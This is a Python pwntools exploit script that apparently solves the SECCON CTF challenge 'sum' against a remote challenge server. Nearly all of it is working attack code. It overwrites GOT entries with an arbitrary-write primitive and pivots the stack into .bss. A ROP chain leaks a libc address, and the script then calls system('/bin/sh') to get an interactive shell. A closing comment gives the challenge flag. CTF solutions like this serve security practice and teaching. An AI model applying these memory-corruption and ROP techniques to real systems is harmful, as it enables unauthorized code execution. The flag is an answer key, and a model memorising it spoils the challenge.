from pwn import *
import time


binpath = "./sum"
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']


gdbscript = """
gef
# b main
# before printf
# b *0x4009bf
"""
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote("sum.chal.seccon.jp", 10001)


def overwrite(addr, value):
    payload = '-{} -2 1 1 {} {}'.format(addr, value, addr)
    io.sendlineafter("2 3 4 0", payload)
    time.sleep(0.1)


# Step 1: Leak libc
addr_pop_rdi_ret = 0x0000000000400a43
addr_pop_rbp_ret = 0x00000000004006d8
addr_leave_ret = 0x00000000004007eb
addr_pop_rsi_rdi_ret = 0x0000000000400a41

overwrite(elf.got["exit"], elf.symbols["main"])
overwrite(elf.got["printf"], addr_pop_rdi_ret)

# construct rop chain at pivot address
addr_pivot = elf.bss() + 0x908  # the 8 is for SIMD instruction

payload = []
payload.append(addr_pop_rdi_ret)
payload.append(elf.got["alarm"])
payload.append(elf.plt["puts"])
payload.append(elf.symbols["main"])  # main

for i, val in enumerate(payload):
    overwrite(addr_pivot + i * 8, val)


# fire rop to leak libc
ints = "{} {} {} 0".format(addr_pop_rbp_ret, addr_pivot - 8, addr_leave_ret)
io.sendlineafter("2 3 4 0", ints)

io.recvline()
data = io.recvline().rstrip()
addr_libc = u64(data.ljust(8, b"\x00")) - 0xe4840
print("addr_libc = 0x{:x}".format(addr_libc))


# Step 2: system("/bin/sh")
ints = "{} {} {} 0".format(
                              addr_pop_rdi_ret,
                              addr_libc + next(libc.search(b"/bin/sh")),
                              addr_libc + libc.symbols["system"])
io.sendlineafter("2 3 4 0", ints)


io.interactive()

# solved after the contest
# SECCON{ret_call_call_ret??_ret_ret_ret........shell!}
